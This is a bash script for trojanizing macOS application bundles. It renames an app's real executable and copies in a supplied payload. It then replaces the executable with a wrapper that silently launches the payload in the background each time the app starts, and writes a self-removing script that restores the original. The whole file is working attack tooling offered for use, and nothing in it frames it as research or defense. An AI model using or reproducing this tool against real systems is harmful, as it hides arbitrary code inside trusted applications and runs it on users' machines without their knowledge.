#!/usr/bin/env bash

RED="\e[31m"
CYAN="\e[36m"
YELLOW="\e[33m"
GREEN="\e[32m"
RESET="\e[0m"

function log { printf "* $1.\n"; }
function succ { printf "${GREEN}$1${RESET}\n"; }
function warn { printf "${YELLOW}$1${RESET}\n"; }
function fail {
    printf "${RED}$1${RESET}\n" >&2
    exit 1
}
function logloc {
    if [[ -e "$2" ]]; then
        printf "${CYAN}$1${RESET} @ ${GREEN}$2${RESET}\n"
    else
        fail "$1 not present (at $2)."
    fi
}

if [[ $# -lt 2 ]]; then
    fail "Not enough arguments!"
fi

payload="$1"
app_root="$2"
info="$app_root/Contents/Info.plist"
macos="$app_root/Contents/MacOS"
app_name="$(/usr/libexec/PlistBuddy "$info" -c "Print :CFBundleExecutable")"
binary="$macos/$app_name"
implode="$app_root/implode.sh"

logloc "Payload" "$payload"
logloc "App root" "$app_root"
logloc "Info.plist" "$info"
logloc "MacOS directory" "$macos"
logloc "Original binary" "$binary"

if [[ -f "${binary}_og" ]]; then
    warn "Replacing existing payload."
else
    log "Moving original binary"
    mv "$binary" "${binary}_og"
fi
log "Inserting payload"
cp "$payload" "${binary}_pl"

log "Creating master script"
cat > "$binary" <<'EOF'
#!/usr/bin/env bash

binary="$(dirname "${BASH_SOURCE[0]}")/$(basename "$0")"

"${binary}_pl" &
"${binary}_og"
EOF
cat > "$implode" <<EOF
#!/usr/bin/env bash

mv "Contents/MacOS/${app_name}"{_og,}
rm implode.sh
EOF
log "Making master script, implosion script, and payload executable"
chmod +x "${binary}_pl" "$binary" "$implode"

succ "Success!"
